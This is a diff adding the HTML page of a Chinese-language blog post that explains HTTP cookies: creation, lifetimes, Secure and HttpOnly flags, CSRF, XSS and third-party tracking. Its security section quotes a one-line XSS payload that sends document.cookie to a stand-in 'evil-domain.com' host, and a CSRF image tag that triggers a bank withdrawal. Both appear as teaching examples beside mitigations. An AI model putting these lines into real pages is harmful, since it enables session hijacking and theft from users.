@@ -1,0 +1,407 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>HTTP Cookie - Try-Lang</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="HTTP CookieHTTP Cookie（也叫 W...">
+  <meta name="author" content="Jane">
+  <link rel="icon" href="/trylang-blog/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/trylang-blog/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/trylang-blog/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/trylang-blog/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/trylang-blog/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/trylang-blog/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_s6x2xcokxrl.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '/images/theme/loading2.gif'
+      },
+      donate: {
+        enable: true,
+        alipay: 'https://cdn.jsdelivr.net/gh/trylang/imageManager/picgo/20210119143031.png',
+        wechat: ''
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '/trylang-blog/images/theme/welcome-image.jpg',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        model: 'simple'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+    </div>
+    <div class="center">HTTP Cookie</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+
+<nav class="menu">
+  <div class="menu-wrap">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/trylang-blog/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/trylang-blog/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/trylang-blog/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/trylang-blog/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/trylang-blog/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/trylang-blog/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="https://ixibanyayu.com/wp-content/uploads/2018/08/meiguomeiren-fanti.jpg" src="/trylang-blog/images/theme/empty.jpg"  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">HTTP Cookie</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>February 25, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>3077</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <h1 id="HTTP-Cookie"><a href="#HTTP-Cookie" class="headerlink" title="HTTP Cookie"></a>HTTP Cookie</h1><p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless">无状态</a>的HTTP协议记录稳定的状态信息成为了可能。</p>
+<p>Cookie 主要用于以下三个方面：</p>
+<ul>
+<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>
+<li>个性化设置（如用户自定义设置、主题等）</li>
+<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>
+</ul>
+<h2 id="1-创建Cookie"><a href="#1-创建Cookie" class="headerlink" title="1. 创建Cookie"></a>1. <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#%E5%88%9B%E5%BB%BAcookie">创建Cookie</a></h2><p>当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie"><code>Set-Cookie</code></a> 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie"><code>Cookie</code></a> 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p>
+<p>第一次：浏览器向服务器发送请求；</p>
+<p>第二次：服务器收到请求，给响应头中添加Set-Cookie选项，并返回数据；</p>
+<p>第三次；浏览器收到服务器发来的cookie，并保存。之后浏览器每次请求都会发cookie给服务器。</p>
+<h2 id="2-Set-Cookie响应头部和Cookie请求头部"><a href="#2-Set-Cookie响应头部和Cookie请求头部" class="headerlink" title="2. Set-Cookie响应头部和Cookie请求头部"></a>2. <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#set-cookie%E5%93%8D%E5%BA%94%E5%A4%B4%E9%83%A8%E5%92%8Ccookie%E8%AF%B7%E6%B1%82%E5%A4%B4%E9%83%A8"><code>Set-Cookie响应头部</code>和<code>Cookie请求头部</code></a></h2><p>服务器使用 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie"><code>Set-Cookie</code></a> 响应头部向用户代理（一般是浏览器）发送 Cookie信息。一个简单的 Cookie 可能像这样：</p>
+<figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">Set-Cookie: <span class="hljs-attribute">&lt;cookie名&gt;</span>=<span class="hljs-attribute">&lt;cookie值&gt;</span><br></code></pre></td></tr></table></figure>
+<p>浏览器携带cookie：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sample_page.html</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.example.org<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>yummy_cookie=choco; tasty_cookie=strawberry<br></code></pre></td></tr></table></figure>
+<h2 id="3-定义-Cookie-的生命周期"><a href="#3-定义-Cookie-的生命周期" class="headerlink" title="3. 定义 Cookie 的生命周期"></a>3. <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#%E5%AE%9A%E4%B9%89_cookie_%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F">定义 Cookie 的生命周期</a></h2><p>Cookie 的生命周期可以通过两种方式定义：</p>
+<ul>
+<li>会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（<code>Expires</code>）或者有效期（<code>Max-Age</code>）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 Cookie 的生命周期无限期延长。</li>
+<li>持久性 Cookie 的生命周期取决于过期时间（<code>Expires</code>）或有效期（<code>Max-Age</code>）指定的一段时间。</li>
+</ul>
+<p>例如：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Set</span>-Cookie: id=a<span class="hljs-number">3</span>fWa; Expires=Wed, <span class="hljs-number">21</span> Oct <span class="hljs-number">2015</span> <span class="hljs-number">07</span>:<span class="hljs-number">28</span>:<span class="hljs-number">00</span> GMT;<br></code></pre></td></tr></table></figure>
+<p><strong>提示：</strong>当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。</p>
+<p>如果您的站点对用户进行身份验证，则每当用户进行身份验证时，它都应重新生成并重新发送会话 Cookie，甚至是已经存在的会话 Cookie。此技术有助于防止<a target="_blank" rel="noopener" href="https://wiki.developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#Session_fixation">会话固定攻击（session fixation attacks）</a>，在该攻击中第三方可以重用用户的会话。</p>
+<h2 id="4-限制访问Cookie"><a href="#4-限制访问Cookie" class="headerlink" title="4. 限制访问Cookie"></a>4. 限制访问Cookie</h2><p>两种方法可确保Cookie被安全发送。Secure属性和HttpOnly属性。</p>
+<p><code>Secure</code>： 标记为 <code>Secure</code> 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/MitM">man-in-the-middle</a> 攻击者的攻击。</p>
+<p><code>HttpOnly</code>：JavaScript <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie"><code>Document.cookie</code></a> API 无法访问带有 <code>HttpOnly</code> 属性的cookie；此类 Cookie 仅作用于服务器。例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 <code>HttpOnly</code> 属性。此预防措施有助于缓解<a target="_blank" rel="noopener" href="https://wiki.developer.mozilla.org/zh-CN/docs/Web/Security/Types_of_attacks#Cross-site_scripting_(XSS)">跨站点脚本（XSS）</a>攻击。</p>
+<blockquote>
+<p>注意：不安全的站点（<code>http:</code>）无法使用Cookie的 <code>Secure</code> 标记。</p>
+</blockquote>
+<h2 id="5-安全"><a href="#5-安全" class="headerlink" title="5. 安全"></a>5. 安全</h2><blockquote>
+<p>信息被存在 Cookie 中时，需要明白 cookie 的值时可以被访问，且可以被终端用户所修改的。</p>
+</blockquote>
+<p>缓解涉及Cookie的攻击的方法：</p>
+<ul>
+<li>使用 <code>HttpOnly</code> 属性可防止通过 JavaScript 访问 cookie 值。</li>
+<li>用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 <code>SameSite</code> 属性设置为<code>Strict</code> 或 <code>Lax</code>。（请参见上方的 <a target="_blank" rel="noopener" href="https://wiki.developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies$edit#">SameSite Cookie</a>。）在<a target="_blank" rel="noopener" href="https://wiki.developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Browser_compatibility">支持 SameSite 的浏览器</a>中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。</li>
+</ul>
+<h3 id="会话劫持和-XSS"><a href="#会话劫持和-XSS" class="headerlink" title="会话劫持和 XSS"></a><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81%E5%92%8C_xss">会话劫持和 XSS</a></h3><p>在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/XSS">XSS</a> 攻击。</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">(<span class="hljs-keyword">new</span> Image()).src = <span class="hljs-string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="hljs-built_in">document</span>.cookie;<br></code></pre></td></tr></table></figure>
+<p><code>HttpOnly</code> 类型的 Cookie 用于阻止了JavaScript 对其的访问性而能在一定程度上缓解此类攻击。</p>
+<h3 id="跨站请求伪造（CSRF）"><a href="#跨站请求伪造（CSRF）" class="headerlink" title="跨站请求伪造（CSRF）"></a><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88csrf%EF%BC%89">跨站请求伪造（CSRF）</a></h3><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery">维基百科</a>已经给了一个比较好的 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSRF">CSRF</a> 例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-params">&lt;img src=&quot;http://bank.example.com/withdraw?account=bob<span class="hljs-variable">&amp;amount</span>=<span class="hljs-number">1000000</span><span class="hljs-variable">&amp;for</span>=mallory&quot;&gt;</span><br></code></pre></td></tr></table></figure>
+<p>当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：</p>
+<ul>
+<li>对用户输入进行过滤来阻止 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/XSS">XSS</a>；</li>
+<li>任何敏感操作都需要确认；</li>
+<li>用于敏感信息的 Cookie 只能拥有较短的生命周期；</li>
+<li>更多方法可以查看<a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet">OWASP CSRF prevention cheat sheet</a>。</li>
+</ul>
+<h2 id="6-跟踪和隐私"><a href="#6-跟踪和隐私" class="headerlink" title="6. 跟踪和隐私"></a>6. <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#%E8%B7%9F%E8%B8%AA%E5%92%8C%E9%9A%90%E7%A7%81">跟踪和隐私</a></h2><h3 id="第三方-Cookie"><a href="#第三方-Cookie" class="headerlink" title="第三方 Cookie"></a><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#%E7%AC%AC%E4%B8%89%E6%96%B9_cookie">第三方 Cookie</a></h3><p>Cookie 与域关联。如果此域与您所在页面的域相同，则该 cookie 称为<em>第一方 cookie（ first-party cookie）</em>。如果域不同，则它是<em>第三方 cookie（third-party cookie）</em>。当托管网页的服务器设置第一方 Cookie 时，该页面可能包含存储在其他域中的服务器上的图像或其他组件（例如，广告横幅），这些图像或其他组件可能会设置第三方 Cookie。这些主要用于在网络上进行广告和跟踪。例如，<a target="_blank" rel="noopener" href="https://policies.google.com/technologies/types">types of cookies used by Google</a>。第三方服务器可以基于同一浏览器在访问多个站点时发送给它的 cookie 来建立用户浏览历史和习惯的配置文件。Firefox 默认情况下会阻止已知包含跟踪器的第三方 cookie。第三方cookie（或仅跟踪 cookie）也可能被其他浏览器设置或扩展程序阻止。阻止 Cookie 会导致某些第三方组件（例如社交媒体窗口小部件）无法正常运行。</p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>Jane</li>
+    <li><strong>本文链接：</strong><a href="http://trylang.github.io/trylang-blog/2021/02/25/http/%E5%85%B3%E4%BA%8EHTTP%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/index.html" title="http:&#x2F;&#x2F;trylang.github.io&#x2F;trylang-blog&#x2F;2021&#x2F;02&#x2F;25&#x2F;http&#x2F;%E5%85%B3%E4%BA%8EHTTP%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B&#x2F;index.html">http:&#x2F;&#x2F;trylang.github.io&#x2F;trylang-blog&#x2F;2021&#x2F;02&#x2F;25&#x2F;http&#x2F;%E5%85%B3%E4%BA%8EHTTP%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+          <section class="donate">
+  <div id="qrcode-donate">
+    <img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/trylang/imageManager/picgo/20210119143031.png" src="/trylang-blog/images/theme/empty.jpg" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/trylang-blog/tags/%E5%85%B3%E4%BA%8EHTTP%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/" rel="tag">关于HTTP的那些事</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/trylang-blog/2021/02/25/http/%E8%B7%A8%E6%BA%90%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%EF%BC%88CORS%EF%BC%89/"><i class="iconfont iconleft"></i>跨源资源共享（CORS）</a>
+    <a href="/trylang-blog/2021/02/12/notes/mac%E4%B8%ADmysql%E5%AE%89%E8%A3%85%E5%92%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">mac中mysql安装和学习笔记<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-Cookie"><span class="toc-text">HTTP Cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%88%9B%E5%BB%BACookie"><span class="toc-text">1. 创建Cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Set-Cookie%E5%93%8D%E5%BA%94%E5%A4%B4%E9%83%A8%E5%92%8CCookie%E8%AF%B7%E6%B1%82%E5%A4%B4%E9%83%A8"><span class="toc-text">2. Set-Cookie响应头部和Cookie请求头部</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%AE%9A%E4%B9%89-Cookie-%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-text">3. 定义 Cookie 的生命周期</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AECookie"><span class="toc-text">4. 限制访问Cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%AE%89%E5%85%A8"><span class="toc-text">5. 安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81%E5%92%8C-XSS"><span class="toc-text">会话劫持和 XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89"><span class="toc-text">跨站请求伪造（CSRF）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E8%B7%9F%E8%B8%AA%E5%92%8C%E9%9A%90%E7%A7%81"><span class="toc-text">6. 跟踪和隐私</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9-Cookie"><span class="toc-text">第三方 Cookie</span></a></li></ol></li></ol></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=1594622915 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://github.com/trylang/trylang-blog "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:trylangyp@gmail.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+    <div class="scrollbar j-scrollbar">
+  <div class="scrollbar-current j-scrollbar-current"></div>
+</div>
+  
+  
+    
+<script src="/trylang-blog/js/color-mode.js"></script>
+
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/trylang-blog/js/utils.js"></script>
+<script src="/trylang-blog/js/script.js"></script>
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
